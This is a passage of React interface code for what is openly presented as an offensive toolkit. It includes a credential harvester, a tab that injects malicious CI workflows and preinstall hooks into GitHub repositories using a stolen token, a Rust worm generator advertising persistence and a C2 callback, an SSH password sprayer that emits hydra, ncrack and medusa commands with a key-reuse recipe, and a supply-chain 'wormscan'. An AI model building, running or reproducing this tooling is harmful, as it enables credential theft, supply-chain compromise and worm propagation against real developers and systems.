                <div className="flex-1 overflow-y-auto p-3 space-y-2">
                  {scanResults.map(r => (
                    <button key={r.id} onClick={()=>setSelectedResult(s=>s?.id===r.id?null:r)} className={`w-full text-left border p-3 transition-all ${selectedResult?.id===r.id?"border-red-800 bg-red-950/20":"border-zinc-800 bg-black/20 hover:border-zinc-600"}`}>
                      <div className="flex items-center gap-2">
                        <span className={`text-[8px] px-1.5 py-0.5 font-bold uppercase border flex-shrink-0 ${SEV[r.severity]??SEV["medium"]}`}>{r.severity}</span>
                        <span className="text-[10px] text-white font-bold truncate">{r.name}</span>
                        <span className={`text-[8px] px-1.5 border flex-shrink-0 ${r.status==="free"?"text-red-300 border-red-800":r.status==="generated"?"text-cyan-300 border-cyan-800":"text-zinc-500 border-zinc-700"}`}>{r.status==="free"?"EXPLOITABLE":r.status}</span>
                        <span className="text-[8px] text-zinc-600">{r.registry}</span>
                        <span className="text-[8px] text-zinc-700 ml-auto">{r.artifacts.length}art</span>
                      </div>
                      <div className="text-[9px] text-zinc-500 mt-0.5">{r.category}</div>
                    </button>
                  ))}
                </div>
                {selectedResult && (
                  <div className="w-88 border-l border-white/[.04] overflow-y-auto p-3 space-y-3 shrink-0 bg-black/10" style={{width:"22rem"}}>
                    <div className="flex items-center justify-between">
                      <span className={`text-[8px] px-1.5 py-0.5 font-bold uppercase border ${SEV[selectedResult.severity]??SEV["medium"]}`}>{selectedResult.severity}</span>
                      <button onClick={()=>setSelectedResult(null)} className="text-zinc-700 hover:text-zinc-400 text-xs">✕</button>
                    </div>
                    <div className="text-[11px] font-bold text-white">{selectedResult.name}</div>
                    <div className="space-y-1 bg-black/60 border border-zinc-800 p-3">
                      {selectedResult.steps.map((s,i) => <div key={i} className={`text-[9px] font-mono ${s.includes("FREE")||s.includes("CRIT")?"text-red-400":s.includes("npm")||s.includes("yarn")?"text-yellow-400":s.includes("C2")?"text-purple-400":"text-zinc-500"}`}>{s}</div>)}
                    </div>
                    <div className="space-y-2">
                      {selectedResult.artifacts.map((a,i) => <Artifact key={i} label={a.label} content={a.content} />)}
                    </div>
                    <button onClick={()=>navigator.clipboard.writeText(selectedResult.artifacts.map(a=>`# ${a.label}\n${a.content}`).join("\n\n---\n\n"))}
                      className="w-full py-2 text-[9px] uppercase tracking-widest border border-zinc-800 hover:border-zinc-600 text-zinc-600 hover:text-zinc-300">Copy All Artifacts</button>
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      )}

      {/* ── CREDS TAB ────────────────────────────────────────── */}
      {tab === "creds" && (
        <div className="flex flex-1 min-h-0 overflow-hidden">
          <div className="flex-1 flex flex-col min-h-0 overflow-hidden">
            <div className="border-b border-white/[.04] px-4 py-2 flex items-center gap-3 shrink-0">
              <span className="text-[9px] text-zinc-600 uppercase tracking-widest">Credential Harvester</span>
              <span className="text-[8px] text-zinc-700">Paste any text — env dumps, config files, CI logs, .env, gitconfig, kubeconfig</span>
              <div className="ml-auto flex items-center gap-2">
                <button onClick={pasteFromClipboard} className="text-[9px] px-3 py-1.5 border border-zinc-800 text-zinc-500 hover:text-zinc-300 uppercase tracking-widest">Paste ▾</button>
                <button onClick={runCredScan} className="text-[9px] px-4 py-1.5 border border-red-800/50 bg-red-950/20 text-red-400 hover:border-red-600 uppercase tracking-widest font-bold">Scan</button>
                {credScanned && <button onClick={()=>{ setCredText(""); setCredMatches([]); setCredScanned(false); setSelectedCred(null); }} className="text-[9px] px-2 py-1.5 border border-zinc-800 text-zinc-600 hover:text-zinc-400">Clear</button>}
              </div>
            </div>
            <div className="flex flex-1 min-h-0 overflow-hidden">
              <div className="flex-1 flex flex-col min-h-0">
                <textarea value={credText} onChange={e=>setCredText(e.target.value)}
                  className="flex-1 bg-black/80 text-[11px] text-green-400 font-mono p-4 resize-none focus:outline-none border-r border-white/[.04] placeholder-zinc-800"
                  placeholder={`Paste anything here:\n\nexport AWS_ACCESS_KEY_ID=AKIA...\nexport GITHUB_TOKEN=ghp_...\nnpm_token=npm_...\n\n[default]\naws_access_key_id = AKIA...\naws_secret_access_key = ...\n\n# Or paste entire files, CI logs, etc.`}
                  spellCheck={false}
                />
                {credText.length > 0 && <div className="text-[8px] text-zinc-700 px-3 py-1 border-t border-white/[.04] shrink-0">{credText.split("\n").length} lines · {credText.length} chars</div>}
              </div>
              <div className="w-96 overflow-y-auto shrink-0">
                {!credScanned && (
                  <div className="flex flex-col items-center justify-center h-full text-zinc-700 gap-2 px-6">
                    <span className="text-3xl opacity-20">🔑</span>
                    <p className="text-[10px] uppercase tracking-widest text-center">Paste text on the left and click Scan</p>
                    <p className="text-[9px] text-zinc-800 text-center mt-1">Detects {CRED_PATTERNS.length} credential types: AWS, GitHub, npm, PyPI, Google, Stripe, Slack, Discord, JWT, SSH, DB URIs, K8s, and more</p>
                  </div>
                )}
                {credScanned && credMatches.length === 0 && (
                  <div className="flex flex-col items-center justify-center h-full text-zinc-700 gap-2"><span className="text-3xl opacity-20">✓</span><p className="text-[10px] uppercase tracking-widest">No credentials detected</p></div>
                )}
                {credMatches.length > 0 && (
                  <div className="p-3 space-y-1.5">
                    <div className="text-[9px] text-zinc-600 uppercase tracking-widest mb-2">{credMatches.length} credential{credMatches.length!==1?"s":""} found</div>
                    {credMatches.map((c,i) => (
                      <button key={i} onClick={()=>setSelectedCred(s=>s===c?null:c)}
                        className={`w-full text-left border p-2.5 transition-all ${selectedCred===c?"border-red-800 bg-red-950/20":"border-zinc-800 bg-black/20 hover:border-zinc-600"}`}>
                        <div className="flex items-center gap-2 mb-0.5">
                          <span className={`text-[8px] px-1.5 py-0.5 font-bold uppercase border flex-shrink-0 ${SEV[c.severity]??SEV["medium"]}`}>{c.severity}</span>
                          <span className="text-[10px] font-bold text-white truncate">{c.kind}</span>
                        </div>
                        <div className="text-[9px] text-red-400 font-mono truncate">{c.redacted}</div>
                        <div className="text-[8px] text-zinc-700 mt-0.5">line {c.line}</div>
                        {selectedCred === c && (
                          <div className="mt-2 pt-2 border-t border-zinc-800">
                            <div className="text-[8px] text-zinc-600 mb-1">Full Value (handle with care)</div>
                            <div className="text-[9px] text-orange-400 font-mono break-all">{c.value}</div>
                            <button onClick={e=>{ e.stopPropagation(); navigator.clipboard.writeText(c.value); }}
                              className="mt-2 text-[8px] px-2 py-1 border border-zinc-800 text-zinc-600 hover:text-zinc-300 uppercase">Copy</button>
                          </div>
                        )}
                      </button>
                    ))}
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ── PROPAGATE TAB ────────────────────────────────────── */}
      {tab === "propagate" && (
        <div className="flex flex-1 min-h-0 overflow-hidden">
          <div className="w-56 border-r border-white/[.04] p-4 space-y-3 overflow-y-auto shrink-0 bg-black/20">
            <div>
              <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1.5">GitHub PAT</label>
              <input type="password" value={ghToken} onChange={e=>setGhToken(e.target.value)} placeholder="ghp_…"
                className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-2 text-white focus:outline-none focus:border-red-900/60 placeholder-zinc-700 font-mono" />
            </div>
            <div>
              <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1.5">Injection Mode</label>
              {(["workflow","pkgjson","both"] as const).map(m => (
                <button key={m} onClick={()=>setPropMode(m)} className={`block w-full text-left text-[10px] px-3 py-1.5 border mb-1 uppercase tracking-widest transition-all ${propMode===m?"border-red-800 bg-red-950/30 text-red-400":"border-zinc-800 text-zinc-600 hover:text-zinc-400"}`}>
                  {m==="workflow"?".github/workflows/ci.yml":m==="pkgjson"?"package.json preinstall":"both vectors"}
                </button>
              ))}
            </div>
            <button onClick={fetchRepos} disabled={!ghToken.trim()} className="w-full py-2 text-[10px] border border-zinc-800 text-zinc-500 hover:border-zinc-600 hover:text-zinc-300 uppercase tracking-widest disabled:opacity-30">
              ↺ Fetch Repos
            </button>
            {repoList.length > 0 && (
              <button onClick={runPropagation} disabled={propRunning} className="w-full py-2.5 text-[10px] font-bold uppercase tracking-widest border transition-all disabled:opacity-40 bg-red-950/20 border-red-800/50 text-red-400 hover:border-red-600">
                {propRunning ? <span className="flex items-center justify-center gap-2"><span className="w-3 h-3 border border-red-500 border-t-transparent rounded-full animate-spin"/>Propagating…</span> : `▶ Inject (${repoList.length} repos)`}
              </button>
            )}
            {propRunning && <button onClick={()=>{ propAbort.current?.abort(); setPropRunning(false); }} className="w-full py-1.5 text-[10px] border border-zinc-800 text-zinc-500 hover:text-red-400 uppercase">■ Abort</button>}
            {propResults.length > 0 && (
              <div className="text-[9px] text-zinc-600 border-t border-white/[.04] pt-2">
                <div className="text-green-400">{propResults.filter(r=>r.ok).length} ✓ injected</div>
                <div className="text-red-500">{propResults.filter(r=>!r.ok).length} ✗ failed</div>
              </div>
            )}
          </div>

          <div className="flex-1 flex flex-col min-h-0 overflow-hidden">
            <div ref={propLogRef} className="flex-1 bg-black/80 px-4 py-3 overflow-y-auto font-mono">
              {propLog.length === 0 && (
                <div className="flex flex-col items-center justify-center h-full text-zinc-700 gap-3">
                  <span className="text-4xl opacity-20">🕷</span>
                  <p className="text-[10px] uppercase tracking-widest">Enter a GitHub PAT and fetch repos to begin</p>
                  <p className="text-[9px] text-zinc-800 max-w-xs text-center">Live GitHub API injection — injects malicious CI workflows and package.json preinstall hooks directly via GitHub REST API from this browser session. No backend required.</p>
                </div>
              )}
              {propLog.map((l,i) => (
                <div key={i} className={`text-[9px] leading-[1.6] ${l.includes("✓")?"text-green-400":l.includes("✗")||l.includes("FAIL")||l.includes("ERROR")?"text-red-400":l.includes("▶")?"text-cyan-400":l.includes("■")?"text-orange-400":l.includes("→")?"text-zinc-400":"text-zinc-600"}`}>{l}</div>
              ))}
              {propRunning && <div className="text-[9px] text-red-700 animate-pulse mt-1">● propagating via GitHub API…</div>}
            </div>
            {propResults.length > 0 && (
              <div className="border-t border-white/[.04] max-h-48 overflow-y-auto shrink-0">
                {propResults.map((r,i) => (
                  <div key={i} className={`flex items-center gap-3 px-4 py-1.5 border-b border-white/[.03] text-[9px] ${r.ok?"text-green-400":"text-red-400"}`}>
                    <span className="shrink-0">{r.ok?"✓":"✗"}</span>
                    <span className="font-bold w-32 truncate shrink-0">{r.repo}</span>
                    <span className="text-zinc-600 shrink-0">{r.action}</span>
                    <span className="text-zinc-500 truncate">{r.detail}</span>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* ── RUSTGEN TAB ──────────────────────────────────────── */}
      {tab === "rustgen" && (
        <div className="flex flex-1 min-h-0 overflow-hidden">
          <div className="flex-1 flex flex-col min-h-0 overflow-hidden">
            <div className="border-b border-white/[.04] px-4 py-2 flex items-center gap-3 shrink-0">
              <span className="text-[9px] text-zinc-600 uppercase tracking-widest">Rust Worm Source Generator</span>
              <span className="text-[8px] text-zinc-700">Generates compilable Rust source — Cargo.toml + 6 modules + build script</span>
              <div className="ml-auto flex items-center gap-3">
                {genDone && <button onClick={downloadAll} className="text-[9px] px-3 py-1.5 border border-zinc-700 text-zinc-400 hover:text-zinc-200 uppercase tracking-widest">↓ Download All</button>}
                <button onClick={generateRust}
                  className="text-[9px] px-4 py-1.5 border border-red-800/50 bg-red-950/20 text-red-400 hover:border-red-600 uppercase tracking-widest font-bold">
                  {genDone ? "↺ Regenerate" : "⚡ Generate"}
                </button>
              </div>
            </div>

            {!genDone ? (
              <div className="flex flex-col items-center justify-center flex-1 text-zinc-700 gap-4">
                <span className="text-5xl opacity-20">🦀</span>
                <p className="text-[10px] uppercase tracking-widest">Generate complete Rust worm binary source</p>
                <div className="text-[9px] text-zinc-800 max-w-sm text-center space-y-1">
                  <p>anti-analysis · credential harvesting · GitHub repo injection</p>
                  <p>persistence (bashrc, cron, systemd, git hooks)</p>
                  <p>XOR+HMAC-SHA256 binary C2 protocol over raw TCP</p>
                  <p>Self-propagating via npm typosquat + dep confusion</p>
                  <p>Polymorphic session tokens · Cross-compilation build script</p>
                </div>
                <p className="text-[8px] text-zinc-800">C2 callback: http://{cbHost||"LHOST"}:{cbPort||"9999"}</p>
              </div>
            ) : (
              <div className="flex-1 overflow-y-auto p-4 space-y-3 min-h-0">
                <div className="grid grid-cols-3 gap-2 mb-4 text-[9px] text-zinc-600">
                  <div className="border border-zinc-800 p-2 text-center"><span className="text-white font-bold block">{rustFiles.length}</span>source files</div>
                  <div className="border border-zinc-800 p-2 text-center"><span className="text-white font-bold block">{rustFiles.reduce((a,f)=>a+f.content.split("\n").length,0)}</span>lines of Rust</div>
                  <div className="border border-zinc-800 p-2 text-center"><span className="text-white font-bold block">{Math.round(rustFiles.reduce((a,f)=>a+f.content.length,0)/1024)}KB</span>source size</div>
                </div>
                <div className="text-[9px] text-zinc-600 uppercase tracking-widest mb-2">Build instructions</div>
                <div className="bg-black/60 border border-zinc-800 p-3 text-[10px] text-green-400 font-mono mb-4">
                  <div># Clone output to a new directory</div>
                  <div>cargo new ironworm && cd ironworm</div>
                  <div># Replace files with generated source</div>
                  <div>chmod +x build.sh && ./build.sh</div>
                  <div># Output: dist/ironworm-linux-x64 (~1MB packed)</div>
                  <div># Cross-compile Windows: mingw-w64 required</div>
                </div>
                <div className="text-[9px] text-zinc-600 uppercase tracking-widest mb-2">Generated Files</div>
                {rustFiles.map((f,i) => <Artifact key={i} label={f.name} content={f.content} />)}
              </div>
            )}
          </div>
        </div>
      )}

      {/* ── BRUTE TAB ────────────────────────────────────────── */}
      {tab === "brute" && (
        <div className="flex flex-1 min-h-0 overflow-hidden">

          {/* Config sidebar */}
          <div className="w-60 border-r border-white/[.04] p-4 space-y-3 overflow-y-auto shrink-0 bg-black/20">
            <div className="text-[9px] text-red-400 uppercase tracking-widest font-bold mb-2">SSH Smart Sprayer</div>

            <div>
              <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1">Target Hosts</label>
              <textarea value={bruteHosts} onChange={e=>setBruteHosts(e.target.value)}
                rows={4} placeholder={"192.168.1.0/24\n10.0.0.1\ntarget.example.com"}
                className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none focus:border-red-900/60 placeholder-zinc-700 resize-none font-mono" />
              <div className="text-[8px] text-zinc-700 mt-0.5">{bruteHosts.split(/[\n,]+/).filter(h=>h.trim()).length} hosts</div>
            </div>

            <div>
              <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1">Ports</label>
              <input value={brutePorts} onChange={e=>setBrutePorts(e.target.value)} placeholder="22,2222"
                className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none focus:border-red-900/60 placeholder-zinc-700" />
            </div>

            <div className="flex gap-2">
              <div className="flex-1">
                <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1">Max/User</label>
                <input value={bruteMaxPerUser} onChange={e=>setBruteMaxPerUser(e.target.value)} type="number" min="1" max="20"
                  className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none" />
              </div>
              <div className="flex-1">
                <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1">Jitter ms</label>
                <input value={bruteJitterMs} onChange={e=>setBruteJitterMs(e.target.value)} type="number" min="100" max="10000"
                  className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none" />
              </div>
            </div>

            <div>
              <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1">Custom Users <span className="text-zinc-700">(override)</span></label>
              <textarea value={bruteCustomUsers} onChange={e=>setBruteCustomUsers(e.target.value)}
                rows={3} placeholder={"root\nadmin\nubuntu"}
                className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none placeholder-zinc-700 resize-none font-mono" />
            </div>

            <div>
              <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1">Custom Wordlist <span className="text-zinc-700">(override)</span></label>
              <textarea value={bruteCustomPwds} onChange={e=>setBruteCustomPwds(e.target.value)}
                rows={3} placeholder={"password\n123456\nadmin"}
                className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none placeholder-zinc-700 resize-none font-mono" />
            </div>

            <div className="border-t border-white/[.04] pt-3 space-y-1.5">
              {(["scripts","spray"] as const).map(m => (
                <button key={m} onClick={()=>setBruteMode(m)}
                  className={`block w-full text-left text-[10px] px-3 py-1.5 border mb-0.5 uppercase tracking-widest transition-all ${bruteMode===m?"border-red-800 bg-red-950/30 text-red-400":"border-zinc-800 text-zinc-600 hover:text-zinc-400"}`}>
                  {m==="scripts"?"▤ Script Generator":"▶ Simulate Spray"}
                </button>
              ))}
            </div>

            {bruteMode === "spray" && (
              <div className="space-y-1.5">
                <button onClick={runBruteSimulation} disabled={bruteRunning || !bruteHosts.trim()}
                  className="w-full py-2.5 text-[10px] font-bold uppercase tracking-widest border transition-all disabled:opacity-40 bg-red-950/20 border-red-800/50 text-red-400 hover:border-red-600">
                  {bruteRunning ? <span className="flex items-center justify-center gap-2"><span className="w-3 h-3 border border-red-500 border-t-transparent rounded-full animate-spin"/>Spraying…</span> : "▶ Run Simulation"}
                </button>
                {bruteRunning && <button onClick={()=>{ bruteAbort.current?.abort(); setBruteRunning(false); }} className="w-full py-1.5 text-[10px] border border-zinc-800 text-zinc-500 uppercase">■ Stop</button>}
              </div>
            )}

            <div className="border-t border-white/[.04] pt-2 text-[8px] text-zinc-700 space-y-1">
              <div>Built-in: {bruteUsers().length} users · {brutePwds().length} passwords</div>
              <div>Strategy: rotate users, lockout detect, jittered delay</div>
              <div>Combine with SSH keys from CREDS tab for hybrid auth</div>
            </div>
          </div>

          {/* Main content area */}
          <div className="flex-1 flex flex-col min-h-0 overflow-hidden">

            {bruteMode === "scripts" && (
              <div className="flex-1 overflow-y-auto p-4 space-y-4">
                <div className="text-[9px] text-zinc-600 uppercase tracking-widest mb-1">Generated Attack Scripts</div>

                {/* Python Sprayer */}
                <div className="border border-zinc-800 bg-black/40">
                  <div className="flex items-center justify-between px-3 py-2 border-b border-zinc-800">
                    <span className="text-[10px] font-bold text-blue-400">spray.py — Python Smart Sprayer</span>
                    <div className="flex gap-2">
                      <span className="text-[8px] text-zinc-600">{bruteUsers().length}u · {BRUTE_PASSWORDS.length}p · paramiko</span>
                      <button onClick={()=>bruteCopy(genPythonScript(), "py")} className={`text-[9px] px-2 border transition-colors ${bruteCopied==="py"?"border-green-700 text-green-400":"border-zinc-700 text-zinc-500 hover:text-zinc-300"}`}>
                        {bruteCopied==="py"?"✓":"CPY"}
                      </button>
                    </div>
                  </div>
                  <pre className="p-3 text-[9px] text-green-400 font-mono whitespace-pre-wrap leading-relaxed max-h-72 overflow-y-auto">{genPythonScript()}</pre>
                </div>

                {/* Tool Commands */}
                <div className="border border-zinc-800 bg-black/40">
                  <div className="px-3 py-2 border-b border-zinc-800 text-[10px] font-bold text-yellow-400">Tool Invocations</div>
                  <div className="p-3 space-y-3">
                    {(bruteHosts.split(/[\n,]+/).filter(h=>h.trim()).slice(0,3).length > 0
                      ? bruteHosts.split(/[\n,]+/).filter(h=>h.trim()).slice(0,3)
                      : ["TARGET"]
                    ).map((host, i) => (
                      <div key={i} className="space-y-2">
                        <div className="text-[8px] text-zinc-500 uppercase">{host}</div>
                        {brutePorts.split(",").map(p=>p.trim()).filter(Boolean).map(port => (
                          <div key={port} className="space-y-1.5">
                            <div className="flex items-center gap-2">
                              <span className="text-[8px] text-purple-400 w-14 shrink-0">HYDRA</span>
                              <code className="flex-1 text-[9px] text-zinc-300 font-mono break-all">{genHydraCmd(host, port)}</code>
                              <button onClick={()=>bruteCopy(genHydraCmd(host, port), `h${i}${port}`)} className={`text-[8px] px-1.5 border shrink-0 ${bruteCopied===`h${i}${port}`?"border-green-700 text-green-400":"border-zinc-800 text-zinc-600 hover:text-zinc-300"}`}>{bruteCopied===`h${i}${port}`?"✓":"CPY"}</button>
                            </div>
                            <div className="flex items-center gap-2">
                              <span className="text-[8px] text-cyan-400 w-14 shrink-0">NCRACK</span>
                              <code className="flex-1 text-[9px] text-zinc-300 font-mono break-all">{genNcrackCmd(host, port)}</code>
                              <button onClick={()=>bruteCopy(genNcrackCmd(host, port), `n${i}${port}`)} className={`text-[8px] px-1.5 border shrink-0 ${bruteCopied===`n${i}${port}`?"border-green-700 text-green-400":"border-zinc-800 text-zinc-600 hover:text-zinc-300"}`}>{bruteCopied===`n${i}${port}`?"✓":"CPY"}</button>
                            </div>
                            <div className="flex items-center gap-2">
                              <span className="text-[8px] text-orange-400 w-14 shrink-0">MEDUSA</span>
                              <code className="flex-1 text-[9px] text-zinc-300 font-mono break-all">{`medusa -h ${host} -p ${port} -U users.txt -P passwords.txt -M ssh -t 2 -r ${Math.ceil(parseInt(bruteJitterMs||"1200")/1000)}`}</code>
                              <button onClick={()=>bruteCopy(`medusa -h ${host} -p ${port} -U users.txt -P passwords.txt -M ssh -t 2 -r ${Math.ceil(parseInt(bruteJitterMs||"1200")/1000)}`, `m${i}${port}`)} className={`text-[8px] px-1.5 border shrink-0 ${bruteCopied===`m${i}${port}`?"border-green-700 text-green-400":"border-zinc-800 text-zinc-600 hover:text-zinc-300"}`}>{bruteCopied===`m${i}${port}`?"✓":"CPY"}</button>
                            </div>
                          </div>
                        ))}
                      </div>
                    ))}
                  </div>
                </div>

                {/* Wordlists */}
                <div className="grid grid-cols-2 gap-3">
                  <div className="border border-zinc-800 bg-black/40">
                    <div className="flex items-center justify-between px-3 py-1.5 border-b border-zinc-800">
                      <span className="text-[9px] font-bold text-zinc-400">users.txt ({bruteUsers().length})</span>
                      <button onClick={()=>bruteCopy(bruteUsers().join("\n"), "users")} className={`text-[8px] px-1.5 border ${bruteCopied==="users"?"border-green-700 text-green-400":"border-zinc-800 text-zinc-600 hover:text-zinc-300"}`}>{bruteCopied==="users"?"✓":"CPY"}</button>
                    </div>
                    <div className="p-2 max-h-40 overflow-y-auto">
                      {bruteUsers().map((u,i)=><div key={i} className="text-[9px] text-zinc-400 font-mono">{u}</div>)}
                    </div>
                  </div>
                  <div className="border border-zinc-800 bg-black/40">
                    <div className="flex items-center justify-between px-3 py-1.5 border-b border-zinc-800">
                      <span className="text-[9px] font-bold text-zinc-400">passwords.txt ({brutePwds().length})</span>
                      <button onClick={()=>bruteCopy(brutePwds().join("\n"), "pwds")} className={`text-[8px] px-1.5 border ${bruteCopied==="pwds"?"border-green-700 text-green-400":"border-zinc-800 text-zinc-600 hover:text-zinc-300"}`}>{bruteCopied==="pwds"?"✓":"CPY"}</button>
                    </div>
                    <div className="p-2 max-h-40 overflow-y-auto">
                      {brutePwds().map((p,i)=><div key={i} className="text-[9px] text-zinc-400 font-mono">{p.length===0?"(empty)":p}</div>)}
                    </div>
                  </div>
                </div>

                {/* Key reuse note */}
                <div className="border border-yellow-900/40 bg-yellow-950/10 px-3 py-2.5">
                  <div className="text-[9px] font-bold text-yellow-400 mb-1">Hybrid Key + Password Attack</div>
                  <div className="text-[9px] text-zinc-500 space-y-1">
                    <div>1. Scan creds in CREDS tab — harvest private keys from env dumps, config files</div>
                    <div>2. Export found keys → <code className="text-yellow-300">~/.ssh/id_rsa_target</code></div>
                    <div>3. Try key-based first: <code className="text-yellow-300">ssh -i id_rsa_target user@host</code></div>
                    <div>4. Fall back to password spray if keys fail</div>
                    <div>5. Auto-propagate with <code className="text-yellow-300">ssh_brute::spray_neighbors()</code> in Rust implant</div>
                  </div>
                </div>
              </div>
            )}

            {bruteMode === "spray" && (
              <div className="flex flex-1 min-h-0 overflow-hidden">
                <div ref={bruteLogRef} className="flex-1 bg-black/80 px-4 py-3 overflow-y-auto font-mono text-[9px] leading-relaxed">
                  {bruteLog.length === 0 && !bruteRunning && (
                    <div className="flex flex-col items-center justify-center h-full text-zinc-700 gap-2">
                      <span className="text-4xl opacity-20">🔑</span>
                      <p className="text-[10px] uppercase tracking-widest">Configure hosts and press Run Simulation</p>
                      <p className="text-[9px] text-zinc-800 text-center mt-1 max-w-xs">Frontend simulates spray logic and timing.<br/>Use generated scripts for actual execution.</p>
                    </div>
                  )}
                  {bruteLog.map((l,i) => (
                    <div key={i} className={
                      l.includes("[+]")||l.includes("HIT") ? "text-green-400" :
                      l.includes("FOUND")                  ? "text-red-400 font-bold" :
                      l.includes("⚠")                     ? "text-yellow-400" :
                      l.includes("▶")||l.includes("■")    ? "text-red-400" :
                      l.includes("✗")                      ? "text-zinc-700" :
                      "text-zinc-500"
                    }>{l}</div>
                  ))}
                  {bruteRunning && <div className="text-red-700 animate-pulse mt-1">● spraying…</div>}
                </div>
                {bruteHits.length > 0 && (
                  <div className="w-72 border-l border-white/[.04] p-3 overflow-y-auto shrink-0">
                    <div className="text-[9px] text-green-400 uppercase tracking-widest mb-2">{bruteHits.length} hits</div>
                    {bruteHits.map((h,i)=>(
                      <div key={i} className="border border-green-900/50 bg-green-950/20 p-2 mb-2">
                        <div className="text-[10px] font-bold text-green-400">{h.host}:{h.port}</div>
                        <div className="text-[9px] text-zinc-300 font-mono mt-0.5">{h.user}:{h.pass}</div>
                        <div className="text-[8px] text-zinc-700 mt-0.5">{h.ts}</div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}
          </div>
        </div>
      )}

      {/* ── WORMSCAN TAB ──────────────────────────────────────── */}
      {tab === "wormscan" && (
        <div className="flex flex-1 min-h-0 overflow-hidden">
          <div className="w-52 border-r border-white/[.04] p-4 space-y-3 overflow-y-auto shrink-0 bg-black/20">
            <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mb-1">Target Package</label>
            <input value={wormPkg} onChange={e=>setWormPkg(e.target.value)} placeholder="e.g. lodash" disabled={wormRunning}
              className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none focus:border-red-900/60 placeholder-zinc-700" />
            <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mt-2">GitHub Org</label>
            <input value={wormOrg} onChange={e=>setWormOrg(e.target.value)} placeholder="e.g. acmecorp" disabled={wormRunning}
              className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none focus:border-red-900/60 placeholder-zinc-700" />
            <label className="text-[9px] text-zinc-600 uppercase tracking-widest block mt-2">GitHub Repo (opt)</label>
            <input value={wormRepo} onChange={e=>setWormRepo(e.target.value)} placeholder="e.g. api-gateway" disabled={wormRunning}
              className="w-full bg-black/60 border border-white/[.06] text-[10px] px-2 py-1.5 text-white focus:outline-none focus:border-red-900/60 placeholder-zinc-700" />
            <div className="text-[9px] text-zinc-700 border-t border-white/[.04] pt-3">
              <p>C2: {cbHost||"LHOST"}:{cbPort||"9999"}</p>
              <p className="text-[8px] text-zinc-800 mt-1">Configured in header ↑</p>
            </div>
            <div className="flex gap-2 pt-1">
              <button onClick={startWormScan} disabled={wormRunning || (!wormPkg.trim() && !wormOrg.trim())}
                className="flex-1 py-2.5 text-[10px] font-bold uppercase tracking-widest border transition-all disabled:opacity-40"
                style={{background:wormRunning?"transparent":"rgba(220,38,38,.15)",borderColor:wormRunning?"rgba(255,255,255,.07)":"rgba(220,38,38,.5)",color:wormRunning?"#52525b":"#f87171"}}>
                {wormRunning
                  ? <span className="flex items-center justify-center gap-2"><span className="w-3 h-3 border border-red-500 border-t-transparent rounded-full animate-spin"/>Scanning…</span>
                  : "► WORMSCAN"}
              </button>
              {wormRunning && <button onClick={stopWormScan} className="px-3 border border-zinc-800 text-zinc-500 hover:text-red-400 text-[10px]">■</button>}
            </div>
          </div>

          <div className="flex-1 flex flex-col min-h-0 overflow-hidden">
            {wormProgress && (
              <div className="border-b border-white/[.04] px-4 py-2 flex items-center gap-3 shrink-0 bg-black/30">
                <div className="flex-1 bg-zinc-900 h-1.5 rounded-full overflow-hidden">
                  <div className="h-full bg-red-700 transition-all duration-300" style={{width:`${wormProgress.pct}%`}} />
                </div>
                <span className="text-[9px] text-zinc-500 w-8 text-right">{wormProgress.pct}%</span>
                <span className="text-[9px] text-zinc-600 truncate max-w-[200px]">{wormProgress.label}</span>
              </div>
            )}

            <div ref={wormLogRef} className="border-b border-white/[.04] bg-black/80 px-4 py-3 overflow-y-auto"
              style={{height: wormResults.length === 0 ? "100%" : "9rem"}}>
              {wormLogs.length === 0 && !wormRunning && (
                <div className="flex flex-col items-center justify-center h-full text-zinc-700 gap-2">
                  <span className="text-4xl opacity-20">⛓</span>
                  <p className="text-[10px] uppercase tracking-widest">Configure targets and launch WORMSCAN</p>
                  <p className="text-[9px] text-zinc-800">Streams live results from the supply-chain scanner</p>
                </div>
              )}
              {wormLogs.map((l,i) => (
                <div key={i} className={`text-[9px] font-mono leading-[1.5] ${l.level==="error"?"text-red-400":l.level==="warn"?"text-orange-300":l.level==="success"?"text-green-400":"text-zinc-500"}`}>
                  <span className="text-zinc-700 mr-2">{new Date(l.ts).toLocaleTimeString()}</span>{l.msg}
                </div>
              ))}
              {wormRunning && <div className="text-[9px] text-red-700 animate-pulse mt-1">● scanning live registries…</div>}
            </div>

            {wormResults.length > 0 && (
              <div className="flex-1 overflow-y-auto p-3 space-y-2 min-h-0">
                <div className="flex items-center gap-4 mb-2 text-[9px]">
                  <span className="text-zinc-600 uppercase tracking-widest">{wormResults.length} findings</span>
                  <span className="text-red-400">{wormResults.filter(r=>r.severity==="critical").length} critical</span>
                  <span className="text-orange-400">{wormResults.filter(r=>r.severity==="high").length} high</span>
                  <span className="text-green-400 ml-auto">{wormResults.filter(r=>r.status==="success").length} exploitable</span>
                </div>
                {wormResults.map((r,i) => (
                  <div key={i} className={`border p-3 text-[10px] transition-all ${r.severity==="critical"?"border-red-900/50 bg-red-950/10":r.severity==="high"?"border-orange-900/40 bg-orange-950/10":"border-zinc-800"}`}>
                    <div className="flex items-center gap-2 mb-1">
